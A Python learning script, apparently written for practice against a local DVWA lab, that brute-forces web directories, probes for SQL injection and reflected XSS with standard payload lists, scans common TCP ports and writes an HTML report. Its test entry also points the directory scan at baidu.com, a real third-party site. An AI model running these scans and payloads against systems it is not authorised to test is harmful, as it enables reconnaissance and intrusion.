import requests
import re
import socket
import datetime


def get_web_info(url):
    try:
        response = requests.get(url, timeout=5)
        print(f"状态码：{response.status_code}")
        print(f"响应头：{response.headers}")

        response.encoding = response.apparent_encoding
        title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
        title = title_match.group(1) if title_match else "无标题"
        print(f"页面标题：{title}")

    except Exception as e:
        print(f"请求失败：{e}")


def dir_scan(url, dict_file):
    if not url.endswith('/'):
        url = url + '/'

    try:
        with open(dict_file, 'r', encoding='utf-8') as f:
            for line in f:
                path = line.strip()
                if not path:
                    continue

                target_url = url + path
                try:
                    resp = requests.get(target_url, timeout=3)
                    if resp.status_code == 200:
                        print(f"[+] 发现路径: {target_url} (状态码: 200)")
                    elif resp.status_code == 403:
                        print(f"[!] 禁止访问: {target_url} (状态码: 403)")
                except Exception as e:
                    pass
    except FileNotFoundError:
        print(f"字典文件不存在: {dict_file}")


def check_sql_injection_with_cookie(url, param):
    """
    使用手动获取的cookie进行SQL注入检测
    """
    # 设置cookie（用你从浏览器复制的值）
    cookies = {
        'PHPSESSID': '5nvj4cqhh1tf4f0venon75dv43',  # 你的PHPSESSID
        'security': 'low'
    }

    payloads = [
        "'",
        '"',
        "' OR '1'='1",
        "' AND SLEEP(5)--",
        "1' AND '1'='1"
    ]

    original_url = f"{url}?{param}=1"
    print(f"\n[*] 测试目标: {original_url}")

    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            # 带上cookie发送请求
            response = requests.get(test_url, timeout=5, cookies=cookies)

            # 检查是否被重定向到登录页
            if "login.php" in response.url:
                print(f"[-] 需要登录: {test_url}")
                continue

            # 检查SQL错误关键词
            error_keywords = ['sql', 'mysql', 'syntax', 'error', 'warning', 'unclosed', 'mysql_fetch',
                              'you have an error']
            response_text_lower = response.text.lower()
            has_error = any(keyword in response_text_lower for keyword in error_keywords)

            if has_error:
                print(f"[!] 可能存在SQL注入: {test_url}")
                print(f"    payload: {payload}")
                print(f"    响应中出现错误关键词")
            else:
                print(f"[-] 未检测到明显注入: {payload}")

        except Exception as e:
            print(f"[-] 请求失败: {payload} - {e}")


def check_xss(url, param):
    """
    反射型XSS检测
    """
    cookies = {
        'PHPSESSID': '5nvj4cqhh1tf4f0venon75dv43',
        'security': 'low'
    }

    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert('XSS')",
        "'><script>alert(1)</script>",
        "\"><script>alert(1)</script>"
    ]

    print(f"\n[*] 开始XSS检测...")

    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url, timeout=5, cookies=cookies)

            # 检查payload是否原样返回在响应中
            if payload in response.text:
                print(f"[!] 可能存在XSS: {test_url}")
                print(f"    payload: {payload}")
            else:
                # 只显示第一个payload的结果，避免刷屏
                if payload == payloads[0]:
                    print(f"[-] 未检测到明显XSS: {payload}")

        except Exception as e:
            print(f"[-] 请求失败: {payload} - {e}")


def port_scan(host, ports=None):
    """
    简单的端口扫描
    host: 目标主机，如 localhost 或 127.0.0.1
    ports: 端口列表，默认扫描常见端口
    """
    if ports is None:
        # 常见端口
        ports = [21, 22, 23, 80, 443, 3306, 3389, 8080, 8443]

    print(f"\n[*] 开始扫描 {host} 的端口...")

    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"[+] 端口 {port} 开放")
            open_ports.append(port)
        else:
            # 只显示部分关闭端口，避免刷屏
            if port in [80, 443, 3306]:
                print(f"[-] 端口 {port} 关闭")
        sock.close()

    if open_ports:
        print(f"\n[*] 开放端口: {open_ports}")
    return open_ports


def generate_report(target_url, scan_results):
    """
    生成HTML格式的扫描报告
    """
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>安全扫描报告</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #333; }}
        .result {{ margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 5px; }}
        .vuln {{ color: red; font-weight: bold; }}
        .safe {{ color: green; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #4CAF50; color: white; }}
    </style>
</head>
<body>
    <h1>Web安全扫描报告</h1>
    <p>扫描时间: {now}</p>
    <p>扫描目标: {target_url}</p>

    <h2>SQL注入检测结果</h2>
    <table>
        <tr><th>Payload</th><th>结果</th></tr>
"""

    for payload, result in scan_results.get('sql_injection', {}).items():
        vuln_class = "vuln" if "存在" in result else "safe"
        html += f"<tr><td>{payload}</td><td class='{vuln_class}'>{result}</td></tr>"

    html += """
    </table>

    <h2>目录爆破结果</h2>
    <ul>
"""

    for path in scan_results.get('dirs', []):
        html += f"<li>发现路径: {path}</li>"

    html += """
    </ul>

    <h2>建议</h2>
    <ul>
        <li>对发现的漏洞进行修复</li>
        <li>加强输入验证和过滤</li>
        <li>使用参数化查询防止SQL注入</li>
    </ul>
</body>
</html>
"""

    filename = f"scan_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html)

    print(f"\n[+] 报告已生成: {filename}")
    return filename


# 测试入口
if __name__ == "__main__":
    target = "http://localhost/DVWA/vulnerabilities/"

    # 1. 目录爆破
    print("=" * 50)
    print("测试1：目录爆破")
    print("=" * 50)
    dir_scan("https://www.baidu.com", "dict.txt")

    print("\n" + "=" * 50 + "\n")

    # 2. SQL注入检测
    print("=" * 50)
    print("测试2：SQL注入检测")
    print("=" * 50)
    check_sql_injection_with_cookie(target + "sqli/", "id")

    # 3. XSS检测
    print("\n" + "=" * 50)
    print("测试3：XSS检测")
    print("=" * 50)
    check_xss(target + "xss_r/", "name")

    # 4. 端口扫描
    print("\n" + "=" * 50)
    print("测试4：端口扫描")
    print("=" * 50)
    port_scan("localhost")